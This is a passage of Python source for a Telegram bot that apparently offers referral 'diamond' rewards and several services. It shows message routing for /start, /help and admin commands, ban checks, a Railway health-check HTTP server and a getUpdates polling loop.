                f"📅 <b>Today's Referral Diamonds:</b> <code>{ref_res['referrer_daily_count']} / {max_daily} 💎</code>",
            )
        elif ref_res.get("reason") == "daily_limit_reached":
            bot.send_message(
                r_id,
                f"ℹ️ <b>New Referral Joined ({html_escape(first_name)})!</b>\n"
                f"You have already reached the maximum daily referral limit of <b>{max_daily} 💎 Diamonds/day</b> today. "
                f"Your counter resets tomorrow!",
            )

    if user.get("is_banned") == 1 and not is_user_admin(user_id):
        bot.send_message(chat_id, "🚫 <b>You are banned from using this bot.</b>")
        return

    if text.startswith("/start") or text.startswith("/help"):
        clear_state(user_id)
        bot.send_message(
            chat_id,
            render_home_dashboard(bot, user, is_new=is_new),
            reply_markup=build_main_menu_keyboard(user_id),
        )
        return

    if text.startswith("/admin"):
        if not is_user_admin(user_id):
            bot.send_message(
                chat_id,
                "🚫 <b>Access Denied!</b> Only the configured <code>ADMIN_ID</code> can access <code>/admin</code>.",
            )
            return
        clear_state(user_id)
        bot.send_message(
            chat_id,
            render_admin_dashboard(),
            reply_markup=build_admin_home_kb(),
        )
        return

    state = get_state(user_id)
    mode = state.get("mode")
    if mode:
        if mode.startswith("await_svc:"):
            execute_service_input(bot, message, state)
            return
        if mode.startswith("admin_"):
            handle_admin_state_input(bot, message, state)
            return

    bot.send_message(
        chat_id,
        render_home_dashboard(bot, user, is_new=False),
        reply_markup=build_main_menu_keyboard(user_id),
    )


# ============================================================================
# 🌐 RAILWAY HEALTHCHECK HTTP SERVER & POLLING LOOP
# ============================================================================

class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(
            json.dumps(
                {
                    "status": "ok",
                    "bot": "Premium Multi-Service Telegram Bot (service.py)",
                    "time": ist_now_str(),
                }
            ).encode("utf-8")
        )

    def log_message(self, format, *args):
        return


def start_health_server():
    try:
        server = HTTPServer(("0.0.0.0", PORT), HealthCheckHandler)
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        logger.info(f"🌐 Railway Healthcheck HTTP Server listening on port {PORT}")
    except Exception as e:
        logger.warning(f"Health server bind notice: {e}")


def run_bot():
    init_db()

    if not API_BOT:
        print(
            "╔══════════════════════════════════════════════════════════════════╗\n"
            "║ 💎 PREMIUM MULTI-SERVICE BOT (service.py) — READY FOR RAILWAY!   ║\n"
            "╠══════════════════════════════════════════════════════════════════╣\n"
            "║ • Database & 10 Default Services initialized successfully.      ║\n"
            "║ • Set Railway variables: API_BOT and ADMIN_ID to start polling. ║\n"
            "╚══════════════════════════════════════════════════════════════════╝"
        )
        sys.exit(0)

    start_health_server()
    bot = TelegramBotClient(API_BOT)
    me = bot.get_me()
    logger.info(
        f"🚀 Started @{me.get('username', 'Bot')} | Admins: {INITIAL_ADMIN_IDS or 'None set'}"
    )

    offset = 0
    executor = ThreadPoolExecutor(max_workers=12)

    while True:
        try:
            res = bot.api_call(
                "getUpdates",
                {"offset": offset, "timeout": 25, "allowed_updates": ["message", "callback_query"]},
                timeout=35,
            )
            if not res.get("ok"):
                time.sleep(3)
                continue

            for upd in res.get("result", []):
                offset = upd["update_id"] + 1
                if "message" in upd:
                    executor.submit(handle_message, bot, upd["message"])
                elif "callback_query" in upd:
                    executor.submit(handle_callback_query, bot, upd["callback_query"])
        except KeyboardInterrupt:
            logger.info("👋 Bot stopped by user.")
            break
        except Exception as e:
            logger.error(f"Polling loop error: {e}")
            time.sleep(3)


if __name__ == "__main__":
    run_bot()